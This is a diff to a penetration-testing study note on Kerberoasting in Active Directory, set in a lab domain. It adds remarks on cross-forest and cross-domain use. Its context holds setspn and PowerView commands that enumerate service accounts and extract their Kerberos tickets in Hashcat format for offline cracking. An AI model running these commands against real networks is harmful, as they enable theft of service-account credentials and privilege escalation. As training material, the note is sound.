@@ -12,6 +12,8 @@ Domain accounts are often used to run services to overcome network auth limitati
 
 Domain accounts that run services are often local administrators or high privileged domain accounts due to the distributed nature of how the services interact in the network.
 
+> Kerberoasting can also be done cross-forests when either an inbound or bidirectional trust is present.
+
 **The Key Vulnerability**
 Even with a Kerberos ticket for one of these privileged accounts, we cannot just execute commands as that user. However, the ticket ([[Kerberos#Ticket Granting Service (TGS)|TGS-REP]]) is *encrypted with the service account's NTLM hash*. This then means that theoretically, the plain-text password for the service account could be brute forced (eg. [[Hashcat]]).
 
@@ -80,6 +82,7 @@ setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % 
 Import-Module .\PowerView.ps1
 Get-DomainUser * -spn | select samaccountname
 ```
+> This command can also be given a `-Domain` flag for cross-domain kerberoasting
 ### Target a specific user
 ```PowerShell
 Get-DomainUser -Identity [user] | Get-DomainSPNTicket -Format Hashcat
